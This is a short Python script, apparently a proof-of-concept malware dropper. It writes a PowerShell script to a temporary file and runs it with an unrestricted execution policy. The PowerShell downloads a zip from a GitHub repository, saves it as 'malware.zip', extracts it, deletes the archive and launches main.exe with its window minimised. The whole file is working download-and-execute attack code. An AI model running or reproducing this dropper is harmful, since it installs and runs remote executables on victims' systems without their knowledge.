import os
import subprocess
import tempfile
import uuid

t = tempfile.gettempdir() + uuid.uuid4().hex + ".ps1"

with open(t, 'w') as fs:
    fs.write(
        '''
# powershell -ExecutionPolicy Unrestricted -File dropper_ps_script.ps1
Add-Type -Assembly "System.IO.Compression.FileSystem";

$tempFolderPath = Join-Path $Env:Temp $(New-Guid)

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/guibacellar/downloadable_pocs/raw/main/poc001.zip","malware.zip")
[System.IO.Compression.ZipFile]::ExtractToDirectory("malware.zip", $tempFolderPath);
Remove-Item "malware.zip"
Start-Process -FilePath "$tempFolderPath/main.exe" -WindowStyle Minimized
        '''
    )
    fs.flush()
    os.fsync(fs.fileno())
    fs.close()


subprocess.run(["powershell", "-ExecutionPolicy", "Unrestricted", "-File", t])
